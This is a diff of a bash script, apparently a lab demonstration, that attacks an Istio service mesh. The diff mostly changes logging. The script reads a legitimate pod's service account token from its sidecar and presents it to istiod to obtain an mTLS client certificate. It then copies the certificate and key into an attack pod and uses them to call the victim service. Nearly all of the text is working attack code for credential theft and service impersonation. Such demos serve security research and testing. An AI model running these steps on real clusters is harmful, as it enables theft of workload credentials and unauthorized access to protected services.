@@ -1,15 +1,19 @@
 #!/bin/bash
 
-echo "deleting previously generated key and signing request"
+_echo() {
+    echo -e "\033[0;32m == \033[0m $1"
+}
+
+_echo "deleting previously generated key and signing request"
 rm -rf istio-attack.key istio-attack.csr
 
-echo "deleting previously stolen client cert"
+_echo "deleting previously stolen client cert"
 rm -rf istio-attack-stolen-client.crt
 
-echo "generating a random key and signing request"
+_echo "generating a random key and signing request"
 openssl req -new -newkey rsa:2048 -nodes -config csr.conf -keyout istio-attack.key -out istio-attack.csr
 
-echo "'stealing' the service account token from the sidecar proxy of a legit client pod"
+_echo "'stealing' the service account token from the sidecar proxy of a legit client pod"
 legit_pod=$(kubectl get po -n secure -l app=legitclient -ojsonpath='{..metadata.name}')
 legit_token=$(kubectl exec -n secure -c istio-proxy ${legit_pod} -- cat /var/run/secrets/tokens/istio-token)
 
@@ -27,7 +31,7 @@ kubectl port-forward svc/istiod -n istio-system 15012:15012 &
 # wait for port-forward to be established
 sleep 3
 
-echo "using service account ${legit_svc_acct} in namespace ${legit_ns} to ask istiod/citadel for a client certificate"
+_echo "using service account ${legit_svc_acct} in namespace ${legit_ns} to ask istiod/citadel for a client cert"
 istiod_response=$(echo ${payload} | grpcurl -insecure -d @ -rpc-header "authorization: Bearer ${legit_token}" localhost:15012 istio.v1.auth.IstioCertificateService/CreateCertificate)
 
 # this is probably not nice
@@ -43,25 +47,24 @@ stolen_client_cert_mod=$(cat istio-attack-stolen-client.crt | openssl x509 -noou
 istio_attack_key_mod=$(cat istio-attack.key | openssl rsa -noout -modulus | openssl md5)
 
 if [[ "${stolen_client_cert_mod}" == "${istio_attack_key_mod}" ]]; then
-  echo "confirmed that the modulus of our private key matches the modulus of our stolen cert"
-  echo "istiod has successfully issued us an mTLS client cert!" 
+  _echo "confirmed that the modulus of our private key matches the modulus of our stolen cert"
+  _echo "istiod has successfully issued us an mTLS client cert!"
 else
-  echo "something went wrong stealing the client cert, exiting!"
+  _echo "something went wrong stealing the client cert, exiting!"
   exit 1
 fi
 
 attack_pod=$(kubectl get po -n attack -l app=attack -ojsonpath='{..metadata.name}')
 
-echo "copying private key and stolen client cert into attack pod"
+_echo "copying private key and stolen client cert into attack pod"
 kubectl cp istio-attack-stolen-client.crt attack/${attack_pod}:/
 kubectl cp istio-attack.key attack/${attack_pod}:/
 
-echo "attempting to connect to victim service from the attack pod without using stolen credentials"
-echo "(we expect connection will fail: reset by peer)"
+_echo "attempting to connect to victim service from the attack pod without using stolen credentials"
+_echo "(we expect connection will fail: reset by peer)"
 kubectl exec ${attack_pod} -n attack -- curl victim.secure.svc.cluster.local
 
-victim_pod_ip=$(kubectl get po -n secure -l app=victim -ojsonpath='{..ip}')
-
-echo "attempting to connect to victim pod ip addresess from the attack pod (bypassing auto mTLS) using stolen credentials"
-echo "(we expect connection will succeed)"
-kubectl exec ${attack_pod} -n attack -- curl -k --cert istio-attack-stolen-client.crt --key istio-attack.key https://${victim_pod_ip}:80/headers
+echo
+_echo "attempting to connect to victim service from the attack pod using stolen credentials"
+_echo "(we expect connection will succeed)"
+kubectl exec ${attack_pod} -n attack -- curl -k --cert istio-attack-stolen-client.crt --key istio-attack.key https://victim.secure:80/headers
